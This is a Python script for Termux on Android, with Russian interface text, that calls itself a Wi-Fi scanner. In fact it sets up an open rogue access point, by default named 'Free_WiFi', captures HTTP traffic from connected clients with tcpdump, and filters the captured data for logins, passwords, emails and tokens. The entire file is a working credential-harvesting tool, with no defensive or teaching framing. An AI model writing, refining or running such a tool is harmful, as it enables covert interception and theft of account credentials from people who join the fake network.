import os
import time

DATA_FOLDER = 'wifi_data'
OUTPUT_FILE = f'{DATA_FOLDER}/captured_data.txt'

def create_fake_ap(ssid):
    print(f"📡 Запускаю точку доступа: {ssid}")
    os.system('svc wifi disable')
    time.sleep(1)
    os.system(f'cmd wifi start-softap {ssid} open')
    print(f"✅ Точка '{ssid}' активна")

def stop_fake_ap():
    os.system('cmd wifi stop-softap')
    time.sleep(1)
    os.system('svc wifi enable')
    print("🛑 Точка остановлена, Wi-Fi восстановлен")

def listen_http_traffic():
    print(f"👂 Слушаю HTTP трафик... (Ctrl+C для остановки)")
    print(f"📁 Данные сохраняются в {OUTPUT_FILE}")
    try:
        os.system(f'tcpdump -i wlan0 -A -l "tcp port 80 or tcp port 8080" >> {OUTPUT_FILE} 2>&1')
    except KeyboardInterrupt:
        print("\n⏹️ Остановлено")

def show_captured_data():
    if os.path.exists(OUTPUT_FILE):
        print(f"\n📁 {OUTPUT_FILE}:")
        with open(OUTPUT_FILE, 'r', errors='ignore') as f:
            content = f.read()
            if content.strip():
                for line in content.split('\n'):
                    if any(w in line.lower() for w in ['login', 'password', 'user', 'pass', 'email', 'token']):
                        print(f"🔑 {line.strip()}")
            else:
                print("📭 Пусто")
    else:
        print("❌ Файл не найден")

def show_statistics():
    print("\n📊 Статистика:")
    os.system('cmd wifi list-softap-clients 2>/dev/null || echo "Нет данных"')

def main():
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    
    print("""
╔══════════════════════════════════╗
║  📡 Wi-Fi СКАНЕР (Termux)      ║
╚══════════════════════════════════╝
""")
    
    ssid = input('📶 Название сети: ').strip() or "Free_WiFi"
    
    while True:
        print("""
╔══════════════════════════════════╗
║  1. Создать точку доступа       ║
║  2. Слушать HTTP трафик         ║
║  3. Захваченные данные          ║
║  4. Статистика клиентов         ║
║  5. Остановить точку            ║
║  6. Выход                       ║
╚══════════════════════════════════╝
""")
        
        choice = input('>>> ').strip()
        
        if choice == '1': create_fake_ap(ssid)
        elif choice == '2': listen_http_traffic()
        elif choice == '3': show_captured_data()
        elif choice == '4': show_statistics()
        elif choice == '5': stop_fake_ap()
        elif choice == '6': stop_fake_ap(); print(f"👋 Данные в {DATA_FOLDER}/"); break
        else: print('❌ 1-6')

if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: print("\n👋 Выход")
